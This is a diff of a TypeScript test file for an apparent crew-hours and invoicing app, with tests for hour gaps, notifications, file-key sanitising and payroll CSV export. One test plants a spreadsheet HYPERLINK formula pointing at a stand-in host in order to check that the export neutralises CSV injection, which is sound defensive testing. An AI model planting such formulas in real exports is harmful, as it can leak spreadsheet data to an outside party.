@@ -262,7 +262,12 @@ describe('DemoSource aggregations (§18 numbers, Fri Oct 9 2026)', () => {
     expect(bl.totals).toEqual({ invoiced: 212, reported: 196, gap: 16 });
     expect(bl.days.map((d) => d.gap)).toEqual([0, 4, 4, 4, 4]);
     expect(bl.evidence.length).toBeGreaterThan(0);
-    expect(bl.evidence.some((e) => e.quote.includes('five electricians'))).toBe(true);
+    expect(bl.evidence.some((e) => e.quote?.includes('five electricians'))).toBe(true);
+    // W3-06: every gap day cites its voice-note second (P7 plays it there).
+    const hero = bl.evidence.find((e) => e.reportNo === 'RL-2041-0187')!;
+    expect(hero).toMatchObject({ kind: 'voice_note', at: 19.5 });
+    expect(hero.clipId).toBeTruthy();
+    expect(bl.evidence.every((e) => e.kind === 'voice_note')).toBe(true);
   });
 
   it('weather Oct 2026: 10 site-days, 36.5 h, 7 claim-ready', async () => {
@@ -734,5 +739,98 @@ describe('DemoSource.updateOrg (setup wizard company step in an existing org)', 
         timezone: 'America/Chicago',
       }),
     ).resolves.toMatchObject({ inviteError: null, recipientsError: null });
+  });
+});
+
+describe('Crew hours on v1.2 (W3-06)', () => {
+  const week = ['2026-10-05', '2026-10-06', '2026-10-07', '2026-10-08', '2026-10-09'];
+  // A second Apex invoice for the week (the newer one is compared): Friday +8 h is the day
+  // Northgate's report came in by call (§18.1: Kevin called at 17:10, Apex 3 × 8 h).
+  const apexInvoice = (store: DemoStore, fri: number) => ({
+    companyId: store.data.companies.find((c) => c.name === 'Apex Concrete')!.id,
+    invoiceNo: 'AP-1098',
+    periodStart: week[0]!,
+    periodEnd: week[4]!,
+    lines: week.map((date, i) => ({ date, hours: [88, 96, 96, 88, fri][i]! })),
+  });
+
+  it('cites Northgate’s call second for a gap on the day Kevin called in', async () => {
+    const { source: s, store } = source('ops');
+    await s.addInvoice(apexInvoice(store, 112));
+    const h = await s.getHours('2026-W41');
+    const inv = h.invoices.find((i) => i.invoiceNo === 'AP-1098')!;
+    expect(inv.totals.gap).toBe(8);
+    const call = inv.evidence.find((e) => e.kind === 'call')!;
+    expect(call.reportNo).toMatch(/^NG-2210-/);
+    expect(call.date).toBe('2026-10-09');
+    expect(call.clipId).toBe(store.data.calls.find((c) => c.report_id === call.reportId)!.id);
+    expect(call.at).toBe(10);
+    // No transcript of that call in the demo: the crew line stands in for the words.
+    expect(call.quote).toBeNull();
+    expect(call.crew).toEqual({
+      company: 'Apex Concrete',
+      lines: [{ workers: 3, hoursEach: 8 }],
+      total: 24,
+    });
+  });
+
+  it('posts one invoice_gap notice per invoice and gap, to ops and accounts', async () => {
+    const store = new DemoStore();
+    const ops = source('ops', store).source;
+    const before = store.data.notifications.filter((n) => n.kind === 'invoice_gap').length;
+    await ops.addInvoice(apexInvoice(store, 112));
+    const notices = store.data.notifications.filter((n) => n.kind === 'invoice_gap');
+    expect(notices).toHaveLength(before + 1);
+    expect(notices[0]).toMatchObject({
+      user_id: null,
+      title: 'Invoice gap: Apex Concrete +8 h',
+      body: 'AP-1098 invoices 480 h · reports show 472 h',
+      target_path: '/hours?week=2026-W41',
+      data: {
+        key: 'invoice_gap',
+        params: {
+          company: 'Apex Concrete',
+          invoiceNo: 'AP-1098',
+          invoiced: 480,
+          reported: 472,
+          gap: 8,
+        },
+      },
+    });
+    expect(store.data.audit.at(-1)).toMatchObject({
+      action: 'invoice.gap_notified',
+      diff: { gap: 8, previous: null, cause: 'invoice_added' },
+    });
+    // Accounts sees it (§13); pm does not.
+    const accounts = await source('accounts', store).source.getNotifications();
+    expect(accounts.some((n) => n.title === 'Invoice gap: Apex Concrete +8 h')).toBe(true);
+    const pm = await source('pm', store).source.getNotifications();
+    expect(pm.some((n) => n.kind === 'invoice_gap')).toBe(false);
+    // A match posts nothing; the seeded BrightLine gap is not posted again.
+    await ops.addInvoice({ ...apexInvoice(store, 104), invoiceNo: 'AP-1099' });
+    expect(store.data.notifications.filter((n) => n.kind === 'invoice_gap')).toHaveLength(
+      before + 1,
+    );
+  });
+
+  it('stores an invoice file under a safe key in the org folder', async () => {
+    const store = new DemoStore();
+    await source('accounts', store).source.addInvoice({
+      ...apexInvoice(store, 104),
+      file: new File(['%PDF'], 'Rechnung_März [Oct] #4.pdf', { type: 'application/pdf' }),
+    });
+    const inv = store.data.invoices.find((i) => i.invoice_no === 'AP-1098')!;
+    expect(inv.file_path).toMatch(
+      new RegExp(`^${store.data.org.id}/[^/]+-Rechnung_Marz_Oct_4\\.pdf$`),
+    );
+  });
+
+  it('neutralises spreadsheet formulas in the demo payroll CSV', () => {
+    const store = new DemoStore();
+    store.data.companies.find((c) => c.name === 'BrightLine Electric')!.name =
+      '=HYPERLINK("https://x.example/?"&A2,"Pay")';
+    const csv = demoPayrollCsv(store, '2026-W41');
+    expect(csv).toContain(`"'=HYPERLINK(""https://x.example/?""&A2,""Pay"")"`);
+    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m);
   });
 });
